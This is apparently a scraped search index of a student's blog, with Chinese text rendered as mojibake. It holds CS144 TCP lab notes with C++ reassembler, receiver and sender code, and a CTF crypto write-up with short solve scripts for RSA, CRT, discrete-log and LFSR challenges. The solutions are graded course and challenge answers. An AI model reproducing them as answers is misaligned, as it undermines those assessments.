_first_unassembled_idx] = data[i - index]; _bitmap[i - _first_unassembled_idx] = true; _unassembled_bytes_num++; } std::string _str = \"\"; while (_bitmap.front()) { _str += _buffer.front(); _buffer.pop_front(); _bitmap.pop_front(); _buffer.push_back('\\0'); _bitmap.push_back(false); } _output.write(_str); _first_unassembled_idx += _str.length(); _unassembled_bytes_num -= _str.length(); if (_eof \u0026\u0026 empty()) { _output.end_input(); } } size_t StreamReassembler::unassembled_bytes() const { return _unassembled_bytes_num; } bool StreamReassembler::empty() const { return unassembled_bytes() == 0; } size_t StreamReassembler::ack_idx() const { return _first_unassembled_idx; } bool StreamReassembler::input_ended() const { return _eof \u0026\u0026 empty(); } ","date":"2023-08-15","objectID":"/cs144_computer_network/:3:1","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"Lab_2 ","date":"2023-08-15","objectID":"/cs144_computer_network/:4:0","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"wrapping_integers ç¼–å†™ä¸€ä¸ªåŒ…è£…æ•´æ•°ç±», ç”¨äºå®ç°åºåˆ—å·çš„åŠ å‡æ³•. å®ç° WrappingInt32 å’Œ uint64_t ä¸¤ä¸ªç±»ä¹‹é—´çš„è½¬æ¢å‡½æ•°. è¿™é‡Œçš„å®ç°å¾ˆç®€å•, å¯¹äºç»å¯¹åºåˆ—å·è½¬åŒ–æˆåºåˆ—å·, åªéœ€è¦åŠ ä¸ŠåŸºå‡†åç§»é‡ isn å³å¯, åŒæ—¶ç”±äºåºåˆ—å·è‡ªåŠ¨å–æ¨¡äº†, å› æ­¤ä¸éœ€è¦å…¶ä»–æ“ä½œ. å¯¹äºåºåˆ—å·è½¬åŒ–æˆç»å¯¹åºåˆ—å·, æƒ³è¦æ‰¾åˆ°ç¦» checkpoint æœ€è¿‘çš„ç»å¯¹åºåˆ—å·. é¦–å…ˆæ³¨æ„åˆ°æœ‰ä»¥ä¸‹å¼å­æˆç«‹: $$ \\begin{aligned} \\text{checkpoint} \u0026= \\text{n} - \\text{isn} + k * 2^{32} + \\text{remainder}\\ \\end{aligned} $$ å…¶ä¸­ k ä¸ºä»»æ„æ•´æ•°, remainder ä¸ºä½™æ•°. é€šè¿‡æ¯”è¾ƒ 2 * remainder å’Œ 1 \u003c\u003c 32 çš„å¤§å°, å°±å¯ä»¥å†³å®šåº”è¯¥é è¿‘å“ªä¸€è¾¹. è®¡ç®—ç»å¯¹åºåˆ—å·æ—¶åº”è¯¥å– k è¿˜æ˜¯ k+1. ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªå‘, å°±æ˜¯å½“ checkpoint \u003c remainder æ—¶, ä¼šå¯¼è‡´ç®—å‡ºçš„å€¼å°äº 0, ä½†æ˜¯æˆ‘ä»¬ç»å¯¹åºåˆ—å·çš„ç±»å‹æ˜¯ uint64_t, å› æ­¤ä¼šå¯¼è‡´æº¢å‡º. æ‰€ä»¥è¿™ç§æƒ…å†µåº”è¯¥å•ç‹¬å¤„ç†. wrapping_integers.cc WrappingInt32 wrap(uint64_t n, WrappingInt32 isn) { return isn + uint32_t(n); } uint64_t unwrap(WrappingInt32 n, WrappingInt32 isn, uint64_t checkpoint) { uint64_t res = uint64_t(n - isn); uint64_t RING = 1ul \u003c\u003c 32; if (res \u003e= checkpoint) { uint64_t k = (res - checkpoint) / RING; uint64_t Mod = (res - checkpoint) % RING; if (2ul * Mod \u003e RING \u0026\u0026 checkpoint \u003e= Mod) { res -= (k + 1ul) * RING; } else { res -= k * RING; } } else { uint64_t k = (checkpoint - res) / RING; uint64_t Mod = (checkpoint - res) % RING; if (2ul * Mod \u003e RING) { res += (k + 1ul) * RING; } else { res += k * RING; } } return res; } ","date":"2023-08-15","objectID":"/cs144_computer_network/:4:1","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"tcp_receiver å®ç° TCP æ¥æ”¶ç«¯, ç”¨äºæ¥æ”¶ TCP æ•°æ®åŒ…å¹¶å°†å…¶é‡ç»„æˆæœ‰åºçš„æ•°æ®æµ. éœ€è¦å¤„ç† syn fin ä¸¤ç§ç‰¹æ®Šæ•°æ®åŒ…, ä»¥åŠä¹±åºæ•°æ®åŒ…. é¦–å…ˆ, ä¸ºäº†ä¾¿äºå¯¹ stream_reassembler çš„æ•°æ®è°ƒç”¨, æˆ‘ä»¬æ–°å»ºäº†ä¸¤ä¸ªæ¥å£, ack_idx å’Œ input_ended , ç”¨äºè·å–ç»å¯¹ ack åºåˆ—å·å’Œåˆ¤æ–­æ˜¯å¦ç»“æŸ. stream_reassembler.hh //! The expected number of syn in the next segment size_t ack_idx() const; //! \\brief Is the stream_reassembler ending? //! \\returns `true` if stream_reassembler has ended bool input_ended() const; stream_reassembler.cc size_t StreamReassembler::ack_idx() const { return _first_unassembled_idx; } bool StreamReassembler::input_ended() const { return _eof \u0026\u0026 empty(); } æ¥ä¸‹æ¥æ˜¯ tcp_receiver çš„å®ç°, é¦–å…ˆæ˜¯ segment_received å‡½æ•°, ç”¨äºæ¥æ”¶æ•°æ®åŒ…å¹¶å¤„ç†. å¤„ç†çš„é€»è¾‘å¦‚ä¸‹: å¦‚æœåœ¨ syn ä¹‹å‰æ”¶åˆ°æ•°æ®åŒ…, åˆ™ç›´æ¥ä¸¢å¼ƒ. _syn_flag _fin_flag æˆ–ç­‰äºå¯¹åº”çš„æ ‡å¿—ä½, è®°å½•æ˜¯å¦å·²ç»å—åˆ°è¿‡å¯¹åº”çš„æ•°æ®åŒ…. å¦‚æœæ”¶åˆ° syn æ•°æ®åŒ…, åˆ™è®°å½• isn åºåˆ—å·, å¹¶å°† syn æ•°æ®åŒ…çš„åºåˆ—å·åŠ ä¸€ä½œä¸ºä¸‹ä¸€ä¸ªæœŸæœ›çš„åºåˆ—å·. ç»å¯¹åºåˆ—å·é€šè¿‡ unwrap å‡½æ•°è½¬åŒ–æˆåºåˆ—å·, å¹¶è°ƒç”¨ stream_reassembler çš„ push_substring å‡½æ•°è¿›è¡Œå¤„ç†. è¿™é‡Œçš„å‚æ•° index æ˜¯æ•°æ®åŒ…å†…å®¹çš„åºåˆ—å·, æ‰€ä»¥éœ€è¦å‡ä¸€. ç„¶åæ˜¯ ackno å‡½æ•°çš„å®ç°, ç•¥æœ‰å°å‘, éœ€è¦åˆ¤æ–­æ˜¯å¦æ”¶åˆ°è¿‡ syn æ•°æ®åŒ…. å¦‚æœæ”¶åˆ°è¿‡, é‚£ä¹ˆé€šè¿‡ç»å¯¹åºåˆ—å·è®¡ç®—åºåˆ—å·è¿”å›å³å¯; å¦‚æœæ²¡æœ‰æ”¶åˆ°è¿‡, é‚£ä¹ˆ ackno åº”è¯¥è¿”å› std::nullopt è€Œä¸æ˜¯ 0. ( ä¸ºå•¥ä¸å¯ä»¥è¿”å› 0 å•Šå–‚ ). PS: å“¦ç”±äº syn æ•°æ®åŒ…æœ‰åˆå§‹åç§»é‡ isn æ‰€ä»¥åœ¨æœªæ”¶åˆ° syn æ•°æ®åŒ…æ—¶, ç»å¯¹åºåˆ—å·åº”è¯¥æ˜¯ 0, åºåˆ—å·æ˜¯æ— æ³•é¢„æµ‹çš„. æ‰€ä»¥è¿™é‡Œçš„ ackno å‡½æ•°åº”è¯¥è¿”å› std::nullopt è€Œä¸æ˜¯ 0. window_size åˆ™è¾ƒä¸ºç®€å•, ç›´æ¥è¿”å› stream_reassembler çš„å‰©ä½™å®¹é‡å³å¯. check_lab2 çš„è¿è¡Œæ—¶é—´åœ¨ 0.90~1.10s å·¦å³. tcp_receiver.hh class TCPReceiver { //! Our data structure for re-assembling bytes. StreamReassembler _reassembler; bool _syn_flag = false; bool _fin_flag = false; size_t _abs_seqno = 0; WrappingInt32 _seqno{0}; WrappingInt32 _isn{0}; //! The maximum number of bytes we'll store. size_t _capacity; // ... } tcp_receiver.cc void TCPReceiver::segment_received(const TCPSegment \u0026seg) { if (!seg.header().syn \u0026\u0026 !_syn_flag) { return; } _syn_flag |= seg.header().syn; _fin_flag |= seg.header().fin; if (seg.header().syn) { _isn = seg.header().seqno; } _seqno = seg.header().seqno + seg.header().syn; _abs_seqno = unwrap(_seqno, _isn, _reassembler.ack_idx()); _reassembler.push_substring(seg.payload().copy(), _abs_seqno - 1, seg.header().fin); } optional\u003cWrappingInt32\u003e TCPReceiver::ackno() const { size_t _abs_ackno = _reassembler.ack_idx() + _syn_flag + _reassembler.input_ended(); if (_abs_ackno \u003e 0) { return wrap(_abs_ackno, _isn); } else { return std::nullopt; } } size_t TCPReceiver::window_size() const { return _capacity - _reassembler.stream_out().buffer_size(); } ","date":"2023-08-15","objectID":"/cs144_computer_network/:4:2","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"Lab_3 ","date":"2023-08-15","objectID":"/cs144_computer_network/:5:0","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"tcp_sender å®ç° TCP å‘é€ç«¯, ç”¨äºå‘é€ TCP æ•°æ®åŒ…å¹¶æ¥æ”¶ ACK æ•°æ®åŒ…. ä¸»è¦å‡½æ•°æœ‰ fill_window ack_received tick ä¸‰ä¸ª. ä¸‹é¢ä»‹ç»å„ä¸ªå‡½æ•°çš„å®ç°é€»è¾‘. Function fill_window() figure-2 sending_space è®¡ç®—æ¥æ”¶ç«¯å½“å‰çª—å£å‰©ä½™å¤§å° sending_space, é»˜è®¤ä¸º 1. è®¡ç®—å…¬å¼å¦‚ä¸Šå›¾ figure-2 æ‰€ç¤º. å½“ sending_space å¤§äº 0 ä¸”æœªå‘é€ fin æ•°æ®åŒ…æ—¶, æŒç»­å‘é€æ•°æ®åŒ…ä»¥å¡«æ»¡çª—å£. åºåˆ—å· seqno ä¸º next_seqno, ä¸‹ä¸€ä¸ªå¾…å‘é€æ•°æ®åŒ…çš„åºåˆ—å·. å¦‚æœæœªå‘é€ syn æ•°æ®åŒ…, åˆ™è®¾ç½® header().syn = true, sending_space å‡ä¸€. è®¡ç®—èƒ½å‘é€çš„æ•°æ®åŒ…å¤§å°å¹¶å¡«å…¥ payload() , sending_space å‡å»æ•°æ®åŒ…å¤§å°. å¦‚æœ sending_space å¤§äº 0 ä¸”æ•°æ®æµç»“æŸ, åˆ™è®¾ç½® header().fin = true, sending_space å‡ä¸€. æ£€æµ‹æ˜¯å¦ä¸ºç©ºæ•°æ®æŠ¥, æ˜¯åˆ™é€€å‡ºå‡½æ•°. å°†æ•°æ®åŒ…åŠ å…¥å‘é€é˜Ÿåˆ—å’Œè¶…æ—¶é˜Ÿåˆ—, å¹¶æ›´æ–° next_seqno å’Œ bytes_in_flight . å‘é€æ•°æ®åŒ…, å¹¶æ£€æµ‹æ˜¯å¦å¼€å§‹è®¡æ—¶. é‡å¤ 2~9 æ­¥éª¤ç›´åˆ°çª—å£å¡«æ»¡æˆ–è€…æ•°æ®æµç»“æŸ. Function ack_received() å¦‚æœæ”¶åˆ°çš„ ACK æ•°æ®åŒ…ä¸åœ¨å‘é€é˜Ÿåˆ—ä¸­, åˆ™é€€å‡ºå‡½æ•°. æ›´æ–°å­˜å‚¨çš„æ¥æ”¶ç«¯çª—å£å¤§å° window_size . å¦‚æœæ”¶åˆ°çš„ ACK æ•°æ®åŒ…åºåˆ—å·å¤§äºç­‰äºè¶…æ—¶é˜Ÿåˆ—ä¸­çš„åºåˆ—å·, åˆ™å°†è¶…æ—¶é˜Ÿåˆ—ä¸­çš„æ•°æ®åŒ…å¼¹å‡º, å¹¶æ›´æ–° bytes_in_flight å’Œè®¡æ—¶. é‡å¤ç¬¬ 3 æ­¥éª¤ç›´åˆ°æ”¶åˆ°çš„ ACK æ•°æ®åŒ…åºåˆ—å·å°äºè¶…æ—¶é˜Ÿåˆ—ä¸­çš„åºåˆ—å·æˆ–è€…è¶…æ—¶é˜Ÿåˆ—ä¸ºç©º. å¦‚æœæœ‰æ›´æ–°é˜Ÿåˆ—, é‚£ä¹ˆé‡æ–°è®¡æ—¶. å¦‚æœé˜Ÿåˆ—ä¸ºç©º, åˆ™åœæ­¢è®¡æ—¶. Function tick() å¦‚æœè®¡æ—¶å™¨å·²ç»åœæ­¢, åˆ™é€€å‡ºå‡½æ•°. è®¡ç®—æ˜¯å¦è¶…æ—¶, å¦‚æœæ²¡æœ‰è¶…æ—¶, åˆ™é€€å‡ºå‡½æ•°. å¦‚æœè¶…æ—¶, åˆ™é‡ä¼ ç¬¬ä¸€ä¸ªæœªç¡®è®¤çš„æ•°æ®åŒ…, å¹¶é‡æ–°è®¡æ—¶. å¦‚æœæ¥æ”¶æ–¹æœ‰ç©ºä½™, é‚£ä¹ˆé‡ä¼ æ¬¡æ•° +1, è¶…æ—¶æ—¶é—´ç¿»å€. tcp_sender.hh class TCPSender { private: bool _fin_sent = false; uint64_t _abs_ackno = 0; uint64_t _bytes_in_flight = 0; uint16_t _receiver_window_size = 1; bool _time_running = false; unsigned int _rto = 0; unsigned int _time_elapsed = 0; unsigned int _consecutive_retransmissions = 0; std::queue\u003cTCPSegment\u003e _segments_outstanding{}; // ... } tcp_sender.cc //! \\param[in] capacity the capacity of the outgoing byte stream //! \\param[in] retx_timeout the initial amount of time to wait before retransmitting the oldest outstanding segment //! \\param[in] fixed_isn the Initial Sequence Number to use, if set (otherwise uses a random ISN) TCPSender::TCPSender(const size_t capacity, const uint16_t retx_timeout, const std::optional\u003cWrappingInt32\u003e fixed_isn) : _rto(retx_timeout) , _isn(fixed_isn.value_or(WrappingInt32{random_device()()})) , _initial_retransmission_timeout{retx_timeout} , _stream(capacity) {} uint64_t TCPSender::bytes_in_flight() const { return _bytes_in_flight; } void TCPSender::fill_window() { size_t sending_space = _abs_ackno + (_receiver_window_size != 0 ? _receiver_window_size : 1) - _next_seqno; while (sending_space \u003e 0 \u0026\u0026 !_fin_sent) { TCPSegment seg; seg.header().seqno = next_seqno(); if (_next_seqno == 0) { seg.header().syn = true; sending_space--; } size_t read_size = min(sending_space, TCPConfig::MAX_PAYLOAD_SIZE); seg.payload() = stream_in().read(read_size); sending_space -= seg.payload().size(); if (stream_in().eof() \u0026\u0026 sending_space \u003e 0) { seg.header().fin = true; _fin_sent = true; sending_space--; } if (seg.length_in_sequence_space() == 0) { return; } segments_out().emplace(seg); if (!_time_running) { _time_running = true; _time_elapsed = 0; } _segments_outstanding.push(seg); _next_seqno += seg.length_in_sequence_space(); _bytes_in_flight += seg.length_in_sequence_space(); } } //! \\param ackno The remote receiver's ackno (acknowledgment number) //! \\param window_size The remote receiver's advertised window size void TCPSender::ack_received(const WrappingInt32 ackno, const uint16_t window_size) { _abs_ackno = unwrap(ackno, _isn, _next_seqno); if (_abs_ackno \u003e _next_seqno) { return; } _receiver_window_size = window_size; bool new_ack = false; while (!_segments_outstanding.empty()) { TCPSegment seg = _segments_outstanding.front(); size_t len = seg.length_in_sequence_space(); uint64_t seqno = unwrap(seg.header().seqno, _isn, _next_seqno); if (seqno + len \u003e _abs_ackno) { break; } _segments_outstanding.pop(); _bytes_in_flight -= len; new_ack = true; } if (new_ack) { _rto = _initial_retransmission_timeout; _time_elapsed = 0; _time_running = !_segments_outstanding.empty(); _consecutive_retransmissions = 0; } } //! \\param[in] ms_since_last_tick the number of milliseconds since the last call to this method void TCPSender::tick(const size_t ms_since_last_tick) { if (!_time_running) { return; } _time_elapsed += ms_since_last_tick; if (_time_elapsed \u003e= _rto) { _segments_out.push(_segments_outstanding.front()); if (_receiver_window_size \u003e 0) { _consecutive_retransmissions++; _rto \u003c\u003c= 1; } _time_elapsed = 0; } ","date":"2023-08-15","objectID":"/cs144_computer_network/:5:1","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["CTF"],"content":"æ‘˜è¦ï¼šé¢„å®šä¸€æ³¢ã€æ¥ç©æ´›å…‹ç‹å›½è°¢è°¢å–µã€çš„ Crypto ä¹‹æ—….","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ã€æ¥ç©æ´›å…‹ç‹å›½è°¢è°¢å–µã€çš„ Crypto ä¹‹æ—…. ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:0:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸŒ€ cyclic group é¢˜ç›®é™„ä»¶ print(long_to_bytes(pow(c, gmpy2.invert(e, p - 1), p))) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:1:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸ¦• cnsså¨˜çš„ä»£ç â…  é¢˜ç›®é™„ä»¶ æ¨¡äº’ç´ çš„çº¿æ€§åŒä½™æ–¹ç¨‹ç»„ï¼Œä½¿ç”¨ CRT å³å¯. print(long_to_bytes(crt(secret,key))) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:2:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸ¢ RSA â…  é¢˜ç›®é™„ä»¶ åŒæ—¶çŸ¥é“ p|mask p\u0026mask ,å¯ä»¥å¾ˆè½»æ˜“åœ°æŒ‰ä½è¿˜åŸå‡º p. mk = (2 ** 512) -1 p = andp | (mk ^^ mask) \u0026 orp q = n//p phi = (p-1)*(q-1) d = inverse_mod(e,phi) flag = long_to_bytes(pow(c,d,n)) print(flag) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:3:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸ² cnsså¨˜çš„ä»£ç  â…¡ é¢˜ç›®é™„ä»¶ ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼Œç›´æ¥æ±‚å°±è¡Œ. G = GF(p) m = discrete_log(G(h),G(g)) print(long_to_bytes(m)) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:4:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸ³ cnsså¨˜çš„ä»£ç  â…¢ é¢˜ç›®é™„ä»¶ G = GF(p) u = A.solve_left(v) flag = b\"\" for item in u: flag += long_to_bytes(int(item)) print(flag) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:5:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸŒ› HomoBlock é¢˜ç›®é™„ä»¶ def NotHomoFunction(x,iv,key): return ((x\u003c\u003civ)\u0026MASK1)^((x\u003e\u003eiv)|MASK2)^key æˆ‘ä»¬å…ˆæ¥åˆ†æåŠ å¯†è¿‡ç¨‹, NotHomoFunction åœ¨æ¯ä¸€è½®ä¸­å®é™…ä¸Šæ¢äº†é«˜ 8 ä½å’Œä½ 8 ä½, ç„¶åå¼‚æˆ–ä¸Š key ^ MASK2. é‚£ä¹ˆæ¯ä¸¤ç»„å¯†æ–‡çš„å¼‚æˆ–å°±æ˜¯ cipher[i] ^ cipher[i+1] = m[i] ^ m[i+1] å…¶ä¸­ m[i] ä¸­é«˜ä½ 8 ä½è¿›è¡Œäº†æ›¿æ¢. åœ¨è¿™ç§åŠ å¯†æ¨¡å¼ä¸‹æˆ‘ä»¬çŸ¥é“ç¬¬ä¸€ç»„æ˜æ–‡çš„å€¼, m[0] = bytes_to_long(b\"cnss{I_a\"). æˆ‘ä»¬å°±å¯ä»¥è¿˜åŸå‡ºæ•´ä¸ªæ˜æ–‡. init = b\"cnss{I_a\" m = [ 0 for i in range(5)] m[0] = bytes_to_long(init) m[0] = ((m[0]\u003c\u003c32)\u0026(0xffffffff00000000)) | ((m[0]\u003e\u003e32)\u0026(0x00000000ffffffff)) for i in range(4): m[i+1] = m[i] ^^ cipher[i] ^^ cipher[i+1] flag = b\"\" for i in range(5): m[i] = ((m[i]\u003c\u003c32)\u0026(0xffffffff00000000)) | ((m[i]\u003e\u003e32)\u0026(0x00000000ffffffff)) flag += long_to_bytes(m[i]) print(flag) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:6:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸ  ezLFSR é¢˜ç›®é™„ä»¶ lenmask = 2 ** 16 -1 seed = 37285 mask = 46359 ifile=open(\"cipher.enc\",'rb') plaintext=ifile.read() flag = \"cnss{**************************}\" assert len(flag) == 32 seq = \"\" for i in range(5): seq += \"{:08b}\".format(plaintext[i]^^ord(flag[i])) for mask in range(65536): state = seed \u0026 lenmask mask \u0026= lenmask cnt = 0 for j in range(5 * 8): nextstate = (state\u003c\u003c1) \u0026 lenmask tmp = state \u0026 mask \u0026 lenmask output = 0 while tmp != 0: output ^^= (tmp \u0026 1) tmp \u003e\u003e= 1 nextstate ^^= output state = nextstate if output != int(seq[j]): break else: cnt+=1 if cnt == 5*8: # print(f\"[+] mask = {mask}\") break state = seed \u0026 lenmask mask \u0026= lenmask flag = \"\" for i in range(32): m = plaintext[i] seq = 0 for j in range(8): nextstate = (state\u003c\u003c1) \u0026 lenmask tmp = state \u0026 mask \u0026 lenmask output = 0 while tmp != 0: output ^^= (tmp \u0026 1) tmp \u003e\u003e= 1 nextstate ^^= output state = nextstate seq = (seq \u003c\u003c1 ) ^^ output flag += chr(seq ^^ m) assert len(flag) == 32 print(flag) ifile.close() ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:7:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸ RSA â…¡ ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:8:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸ¦“ BabyLattice ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:9:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸ–¥ï¸ ezSignature ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:10:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸ¦Š StrangeCurve ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:11:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸ® ä¸€ğŸ”ªä¸€ä¸ªç‰›å¤´äºº ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:12:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"ğŸ¦„ MidLattice ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:13:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"â›ï¸ é“œåŒ çš„ä¸–ç•Œ ä¸ä¼šå–µw^w, æ€ä¹ˆæŠŠ isqrt å’Œ ^^ ä¸¤æ¬¡æŸå¤±çš„ä¿¡æ¯åˆ©ç”¨èµ·æ¥å‘¢? ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:14:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023å¤ä»¤è¥_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":null,"content":"å…³äº ","date":"2023-08-10","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"å…³äºæˆ‘ USETC 21çº§æœ¬ç§‘ç”Ÿ è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯ä¸“ä¸š æ— åæ··å­ ","date":"2023-08-10","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"å…³äºæœ¬ç«™ ä¸å®šæœŸè®°å½•ä¸€äº›å­¦ä¹ å’Œç”Ÿæ´»æ‰€è·ï¼ˆç›®å‰æ¥çœ‹å·²ç»é¸½ç©¿äº† ","date":"2023-08-10","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"å…³äºä»¥å å½¼æ–¹å°šæœ‰è£å…‰åœ¨ï¼Œ________________ ","date":"2023-08-10","objectID":"/about/:3:0","tags":null,"title":"About","uri":"/about/"},{"categories":["Project"],"content":"æ‘˜è¦ï¼šè®°å½•ä¸€ä¸‹è¿™å­¦æœŸæ•°æ®ç»“æ„åšçš„ä¸€ä¸ªé¡¹ç›®","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"\rè¿™æ˜¯æˆ‘æœ¬å­¦æœŸæ•°æ®ç»“æ„è¯¾çš„é¡¹ç›®ä½œä¸šï¼ˆæœ€ç®€å•çš„ä¸€æ¬¡ä½œä¸šï¼Œå…¶ä»–çš„å†™çš„å¤ªçƒ‚äº†ï¼Œæ²¡è„¸æ”¾ï¼‰ã€‚ é¦–å…ˆå°±æŠŠæˆ‘äº¤ä¸Šå»çš„å®éªŒæŠ¥å‘Šè´´ä¸Šæ¥å§ï¼Œæ‡’å¾—å†å†™ä¸€æ¬¡äº†ã€‚ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-æ‰‹åŠ¨åˆ†å‰²çº¿â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“ ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:0:0","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"1.å®éªŒå†…å®¹ç®€ä»‹ åˆ†åˆ«æ ¹æ®ä»¥åº¦ä¸ºæ ‡å‡†å’Œä»¥ Vote Rank ç®—æ³•ä¸ºæ ‡å‡†é€‰å‡ºä¸¤ç»„é‡è¦èŠ‚ç‚¹ç»„ï¼Œç„¶åç”¨ SIR æ¨¡å‹è¯„æµ‹ä¼ 